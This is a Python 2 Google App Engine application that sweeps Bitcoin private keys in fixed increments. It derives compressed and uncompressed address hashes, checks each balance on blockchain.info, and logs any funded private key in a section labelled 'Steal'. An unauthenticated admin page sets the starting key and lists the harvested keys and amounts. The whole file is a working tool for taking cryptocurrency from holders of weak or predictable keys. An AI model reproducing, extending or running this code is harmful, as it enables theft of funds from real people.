'''
'''

######################################################################
import binascii, hashlib, json, logging, socket, urllib, urllib2

##################################################
# Util
HexToInt = lambda h: h and int(h, 16) or 0
IntToHex = lambda i: hex(i)[2:].rstrip('L')
HexToStr = lambda h: binascii.unhexlify('0' * (len(h) % 2) + h)
StrToHex = binascii.hexlify
IntToStr = lambda i: HexToStr(IntToHex(i))
Str32 = lambda s: ('\0'* (32 - len(s)) + s)[-32:]
IntToStr32 = lambda i: Str32(IntToStr(i))

Sha256 = lambda data: hashlib.sha256(data).digest()
from ripemd160 import Ripemd160
Hash160 = lambda data: Ripemd160(Sha256(data))

##################################################
# ECDSA with Secp256k1
ExtEuclid = lambda a, b, y, w: y if b==0 else ExtEuclid(b, a%b, w, y - a/b * w)

P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
InvP = lambda a: ExtEuclid(P, a%P, 0, 1)

PRIVKEY_STEP = 19850730
PUBKEY_STEP = (
      0xb2ff5c6b895ff312ebc0465c8b37a86cb770d2d5837b0129a2610f48e08e4b52,
      0x13d74651a7c22e90a7b89ca3a69cf1c0ee96ab7be8060cf51b66fa4285fa18a8
)
def Step(privkey, pubkey):
    (x1, y1), (x2, y2) = pubkey, PUBKEY_STEP
    k = (y2 - y1) * InvP(x2 - x1)
    rx = k * k - x1 - x2
    ry = k * (x1 - rx) - y1
    return privkey+PRIVKEY_STEP, (rx%P, ry%P)

def EncodePubkey(pubkey, compress=False):
    if compress:
        pubkey_str = chr(2 + pubkey[1]%2) + IntToStr32(pubkey[0])
    else:
        pubkey_str = '\4' + ''.join(map(IntToStr32, pubkey))
    return pubkey_str

##################################################
# Bitcoin
def PubkeyToHash(pubkey, compress=False):
    pubkey_str = EncodePubkey(pubkey, compress)
    hash_str = Hash160(pubkey_str)
    return hash_str

##################################################
# Query

def QueryBalance(account):
    url = 'https://blockchain.info/rawaddr/%s?limit=0' % account
    try:
        # text = '{"final_balance":1}'
        text = URLFetch(url)
        obj = json.loads(text)
        balance = obj['final_balance']
    except Exception as e:
        logging.warn('%s:%s', str(type(e)), str(e))
        balance = 0
    return balance

##################################################
# Steal
def SpendAll(privkey, hash_hex, balance):
    Account(priv=hex(privkey), hash=hash_hex, amount=balance).put()

def SweepKeyPair(privkey, pubkey):
    for compress in (True, False):
        hash_hex = StrToHex(PubkeyToHash(pubkey, compress))
        balance = QueryBalance(hash_hex)
        if balance != 0:  SpendAll(privkey, hash_hex, balance)

def Sweep(privkey, pubkey, n):
    for i in xrange(n):
        SweepKeyPair(privkey, pubkey)
        privkey, pubkey = Step(privkey, pubkey)
    return privkey, pubkey

######################################################################

##################################################
from google.appengine.api import urlfetch
URLFetch = lambda url: urlfetch.fetch(url).content

##################################################
from google.appengine.ext import ndb

class KeyPair(ndb.Model):
    priv = ndb.StringProperty(required=True)
    pubx = ndb.StringProperty(required=True)
    puby = ndb.StringProperty(required=True)
    @classmethod
    def GetLast(cls):
        for kp in cls.query():
            return HexToInt(kp.priv), (HexToInt(kp.pubx), HexToInt(kp.puby))
        return 0, (0, 0)
    @classmethod
    def SetNext(cls, privkey, pubkey):
        for kp in cls.query(): kp.key.delete()
        cls(priv=IntToHex(privkey),
            pubx=IntToHex(pubkey[0]),
            puby=IntToHex(pubkey[1])).put()

class Account(ndb.Model):
    priv = ndb.StringProperty(required=True)
    hash = ndb.StringProperty(required=True)
    amount = ndb.IntegerProperty(required=True)

##################################################
from webapp2 import RequestHandler, WSGIApplication

class MainHandler(RequestHandler):
    def get(self):
        self.response.headers['Content-Type'] = 'text/plain'

        privkey, pubkey = KeyPair.GetLast()
        if not privkey:  return
        num = int(self.request.params.get('num', 1))

        self.response.write('%d + %d*%d == (\n' % (privkey, PRIVKEY_STEP, num))
        privkey, pubkey = Sweep(privkey, pubkey, num)
        KeyPair.SetNext(privkey, pubkey)
        self.response.write('%d)\n' % privkey)
    post = get

class AdminHandler(RequestHandler):
    def get(self):
        # Set next key pair
        if 'priv' in self.request.params:
            try:
                KeyPair.SetNext(HexToInt(self.request.params['priv']),
                                (HexToInt(self.request.params['pubx']),
                                 HexToInt(self.request.params['puby'])))
            except Exception as e:
                logging.warn('%s:%s', str(type(e)), str(e))
        # Clear logs
        if 'clear' in self.request.params:
            for a in Account.query():  a.key.delete()
        # Display
        import jinja2
        template = jinja2.Environment().from_string('''<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head>
<title>Admin</title>
</head><body>
</body></html>
<pre>
import ecdsa
ecdsa.VerifyKeyPair{{key_pair}}
</pre>
<table>
    <tr><th>PRIVKEY</th><th>HASH</th><th>AMOUNT</th></tr>
  {%-for a in accounts %}
    <tr>
        <td>{{a.priv}}</td>
        <td>{{a.hash}}</td>
        <td>{{a.amount}}</td>
    </tr>
  {%-endfor %}
</table><br/>
</body></html>
''')
        html = template.render(accounts=Account.query(),
                               key_pair=KeyPair.GetLast())
        self.response.headers['Content-Type'] = 'text/html'
        self.response.write(html)
    post = get

class DefaultHandler(RequestHandler):
    def get(self):
        self.response.headers['Content-Type'] = 'text/plain'
        self.response.write(self.request)
    post = get

##################################################
app = WSGIApplication([
    (r'/admin', AdminHandler),
    (r'/run', MainHandler),
    (r'/.*', DefaultHandler),
], debug=True)

######################################################################
